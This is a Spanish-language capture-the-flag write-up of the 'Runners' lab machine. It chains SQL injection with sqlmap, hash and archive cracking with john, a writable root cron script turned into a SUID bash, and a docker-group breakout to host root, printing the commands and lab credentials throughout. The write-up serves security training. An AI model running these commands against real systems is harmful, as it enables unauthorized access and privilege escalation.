# Runners

<img width="1345" height="635" alt="image" src="https://github.com/user-attachments/assets/26bf0182-b429-481a-ad1e-fe324032ece9" />

**Plataforma:** The Hackers Labs  
**Dificultad:** Media/Alta  
**OS:** Linux  
**Fecha:** 05/08/2026
 
## 0. Resumen
 
Máquina Linux de dificultad media/alta con una particularidad: no hay un solo salto de usuario, sino una cadena de **cuatro credenciales encontradas en cascada**, repartidas entre un contenedor Docker y el host real

Cada credencial se obtiene explotando el rastro que dejó la anterior
 
El camino de explotación combina:
- Inyección SQL en un parámetro GET, explotada con sqlmap
- Cracking de un hash SHA256 extraído de la base de datos
- Acceso SSH a un contenedor (puerto no estándar) y descubrimiento de un ZIP protegido
- Un archivo `.xlsx` con credenciales de un segundo usuario
- Escalada dentro del contenedor vía script de cron editable (root "de mentira", porque seguimos dentro del contenedor)
- Un archivo de notas que filtra credenciales de un usuario del **host real**
- Un gestor de contraseñas Password Safe (`.psafe3`) con las credenciales de un cuarto usuario
- Escalada final a root real abusando de la pertenencia al grupo `docker`
 
## 1. Reconocimiento

Ping

```bash
ping -c 2 <IP>
```

<img width="1087" height="137" alt="image" src="https://github.com/user-attachments/assets/4dcb323c-8a71-4052-b9b8-3e53bed2d831" />

→ TTL=64 sugiere que se trata de un host Linux

Nmap

```bash
nmap -sCV -Pn -n --open -p- --min-rate 5000 <IP> -oA runners
```

| Orden | Función |
|---|---|
| `-sCV` | Ejecución de Scripts y detección de Versión de servicios |
| `-Pn` |  Omite descubrimiento de host |
| `-n` | Sin resolución de DNS |
| `--open` | Muestra únicamente puertos abiertos |
| `-p-` | Escanea todos los puertos (65535) |
| `--min-rate` | Acelera escaneo enviando 5000 paquetes por segundo |
| `-oA` | Output en todos los formatos (.namp, .xml, .gnmap) |

<img width="1089" height="348" alt="image" src="https://github.com/user-attachments/assets/888f336f-02d2-44de-8f14-908bd76f26cf" />

**Resultados:**
 
- Puerto 22: OpenSSH 9.6p.1

- Puerto 80: Apache 2.4.41

- Puerto 2222: OpenSSH 8.2p1
 
Dos servicios SSH distintos es la primera pista de que hay dos capas de sistema por delante: 

- Host real en el puerto 22
  
- Contenedor expuesto en el puerto no estándar 2222
 
## 2. Enumeración web

<img width="1814" height="805" alt="image" src="https://github.com/user-attachments/assets/f5243144-c712-418a-a4ed-169d7ebb5d54" />

### 2.1 Fuzzing de directorios
 
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -x .php,html,txt,xml,js,env,bak,old,zip,tar,gz,conf,log -t 64
```

| Orden | Función |
|---|---|
| `-u` | URL objetivo |
| `-w` | Diccionario de rutas |
| `-x` | Extensiones de archivo a probar |
| `-t` | Número de hilos concurrentes para peticiones en paralelo |

<img width="1202" height="311" alt="image" src="https://github.com/user-attachments/assets/c7a2cc79-6681-4892-a2a6-b278a2fc252b" />

→ Se localiza `post.php?`, un parámetro GET que recibe un identificador numérico, por lo que se convierte en candidato inmediato a SQLi
 
### 2.2 Confirmación de SQLi
 
Al probar el parámetro con una comilla simple (`post.php?id=1'`) la página responde con un error de sintaxis SQL, lo que confirma que el valor se concatena directamente en la consulta sin sanear

<img width="1801" height="565" alt="image" src="https://github.com/user-attachments/assets/b3757eac-ab57-4f2b-ad8d-81bb34c8160f" />
 
## 3. Explotación - SQLi con SQLmap
 
```bash
sqlmap -u "http://<IP>/post.php?id=1" --dbs
```
 
| Orden | Función |
|---|---|
| `--dbs` | Enumera las bases de datos disponibles en el servidor |

<img width="1146" height="83" alt="image" src="https://github.com/user-attachments/assets/3324a99c-1011-4eda-89ac-5fad859ea49a" />
 
→ Se identifica la base de datos `blog`
 
```bash
sqlmap -u "http://<IP>/post.php?id=1" -D blog --tables

sqlmap -u "http://<IP>/post.php?id=1" -D blog -T users --dump

sqlmap -u "http://<IP>/post.php?id=1" -D blog -T users --columns

sqlmap -u "http://<IP>/post.php?id=1" -D blog -T users -C username,password --dump
```

<img width="1154" height="192" alt="image" src="https://github.com/user-attachments/assets/658be9fe-2951-47df-b24a-a6b29542850c" />
 
→ Se obtienen tres usuarios con sus correspondientes hashes. Por su longitud (64 caracteres hexadecimales) se identifica como **SHA256**
 
## 4. Cracking del hash
 
```bash
echo 'david:527aa9f431539da8e151d5434d1d5e611d973f601d8e970790882624554146b0\nmaria:7927e941a969cdf471354e79b7ae29ae25ca04d59f66d6c19f9c43a9367ec498\nian:febb36d29baf28da1a00cad0cc6937d49f13738ff9dd88276e7c85920d2bff40' > hash.txt

john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
 
→ Contraseña obtenida: `runner` para el usuario `david`
 
## 5. Acceso inicial - SSH al Docker (puerto 2222)

Intentamos acceder al servicio ssh en el puerto 22, pero nos deniega el acceso, así que probamos con el puerto 2222
 
```bash
ssh david@<IP> -p 2222
```
 
→ Acceso confirmado como usuario `david`
 
## 6. Post-explotación (Docker)
 
### 6.1 Localización de ZIP oculto

```bash
ls -la /home/david
```

<img width="1356" height="309" alt="image" src="https://github.com/user-attachments/assets/c07be904-4132-47e5-9237-45947aef00c1" />

→ Se localiza un directorio oculto `/home/david/.hidden` que contiene `credenciales.zip`, protegido por contraseña

Nos lo llevamos a nuestra máquina atacante mediante el comando `scp` 

```bash
scp -P 2222 david@<IP>:/home/david/.hidden/credenciales.zip .
```
 
### 6.2 Cracking del ZIP
 
```bash
zip2john credenciales.zip > zip_hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
```
 
→ Contraseña obtenida: `rockandroll`

### 6.3 Lectura del Excel

Dentro del ZIP hay un archivo `.xlsx`, el cual se abre con LibreOffice porque es la vía más directa para inspeccionar un `.xlsx` sin depender de Microsoft Office
  
```bash
libreoffice --calc credenciales.xlsx
```
 
→ Credenciales obtenidas: `maria:4br53#j6p78mq#zbvc`
 
## 7. Escalada dentro del Docker
 
```bash
su maria
```

### 7.1 Enumeración de procesos con pspy

```bash
scp -P 2222 pspy64 maria@<IP>:/tmp/

./pspy64
```
 
→ Se detecta que el script `backup.sh`, que se ejecuta periódicamente como root **dentro del contenedor**, y `maria` tiene permiso de escritura sobre él
 
### 7.2 Explotación del script
 
```bash
echo 'chmod u+s /bin/bash' >> backup.sh

bash -p
```

<img width="1055" height="57" alt="image" src="https://github.com/user-attachments/assets/acac0956-a5e6-4dfd-88fb-e34b552016a3" />

→ Tras la siguiente ejecución programada, se recibe una shell como root **dentro del contenedor**, no del host real 

Esta distinción es la que marca el resto de la cadena, ya que hay que seguir buscando una vía para salir del Docker
 
### 7.3 Notas filtradas por el root del contenedor

```bash
ls -la /root

cat /root/TODO_LIST.txt
```

<img width="1326" height="77" alt="image" src="https://github.com/user-attachments/assets/844972b0-1311-401e-b8cb-f58b0e28273a" />

→ El archivo contiene credenciales de un usuario del **host real**: `ian:iambatman`
 
## 8. Segundo acceso - SSH al host real (puerto 22)
 
```bash
ssh ian@<IP>
```
 
→ Acceso confirmado como usuario `ian`
 
### 8.1 Password Safe en el home de `elliot`

Una vez dentro del host, listamos el directorio `/home` para identificar usuarios del sistema
 
```bash
ls -la /home
```

<img width="946" height="75" alt="image" src="https://github.com/user-attachments/assets/72e5c03c-ccba-4673-b43a-1919b6de5fc1" />

→ Se localiza el usuario `elliot` en cuyo directorio encontramos `miscredenciales.psafe3`, un archivo cifrado del gestor de contraseñas **Password Safe**
 
```bash
scp miscredenciales.psafe3 <USER>@<IP>:/home/<USER>/Desktop

pwsafe2john miscredenciales.psafe3 > psafe_hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt psafe_hash.txt
```

→ Contraseña maestra obtenida `metallica`

<img width="731" height="417" alt="image" src="https://github.com/user-attachments/assets/570ef1a2-2025-4439-937f-ec7e9ff0026e" />

Abrimos el archivo con `pwsafe` y extraemos las credenciales del usuario `elliot:HwbE80ZOtZQdkYB`
 
```bash
su elliot
```
 
## 9. Escalada a root - Docker breakout
 
### 9.1 Enumeración de grupos
 
```bash
id ; whoami; groups
```

<img width="1041" height="79" alt="image" src="https://github.com/user-attachments/assets/f42c5302-4d6f-43f0-a488-ec16e5178410" />

→ El usuario `elliot` pertenece al grupo `docker`

Pertenecer a este grupo equivale a tener root en el host. Cualquier usuario con acceso al socket de Docker puede montar el sistema de archivos raíz dentro de un contenedor y acceder a él sin restricciones
 
### 9.2 Explotación

Exploramos las opciones disponibles en GTFOBins buscando la palabra docker

<img width="987" height="184" alt="image" src="https://github.com/user-attachments/assets/65184d83-9e8b-4f36-849a-c1cb6c069022" />
 
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

→ Al intentar lanzar el comando tal y como aparece en GTFObins, nos lanza el error `Unable to find image 'alpine:latest' locally`, por lo que vamos a comprobar qué imágenes se encuentran en el docker

```bash
docker images
```

<img width="1028" height="59" alt="image" src="https://github.com/user-attachments/assets/d9f3c753-36f6-4ba3-92fe-1ddfe9286d76" />

→ Encontramos `root_blog:latest`, por lo que adaptamos el comando anterior introduciendo el nombre de esta imagen

```bash
docker run -v /:/mnt --rm -it root_blog:latest chroot /mnt /bin/sh
```

| Fragmento | Función |
|---|---|
| `-v /:/mnt` | Monta la raíz (`/`) del host dentro del contenedor, en `/mnt` |
| `--rm -it` | Contenedor interactivo y desechable tras salir |
| `root_blog:latest` | Imagen base, cualquier imagen con una shell sirve |
| `chroot /mnt` | Cambia la raíz del propio contenedor al sistema de archivos del host |
 
→ Acceso como root real
 
## 9.3 Primera flag (ian)

```bash
cat /home/ian/user.txt
```

## 9.4 Segunda flag (root)

```bash
cat /root/root.txt
```
 
## 10. Lecciones aprendidas

<img width="1067" height="539" alt="image" src="https://github.com/user-attachments/assets/cf710808-5f31-4d84-a173-3d0f5e9e7e75" />
 
- Un parámetro GET numérico sin validar sigue siendo la puerta de entrada más común para SQLi. Sqlmap automatiza toda la fase de extracción una vez confirmada la inyección
  
- Cifrar un ZIP o un `.psafe3` no sustituye una buena contraseña. Si la contraseña es de diccionario, `john` la revienta igual que cualquier otro hash
  
- Una escalada de privilegios "a root" dentro de un contenedor no es una escalada real; conviene verificar siempre el contexto (¿estoy en un contenedor?) antes de asumir que el objetivo está cumplido
  
- Los archivos de notas personales (`TODO_LIST.txt` y similares) son una fuente de credenciales filtradas tan válida como cualquier archivo de configuración
  
- La pertenencia al grupo `docker` equivale a privilegios de root en el host, por lo que debe tratarse con el mismo cuidado que la pertenencia al grupo `sudo`
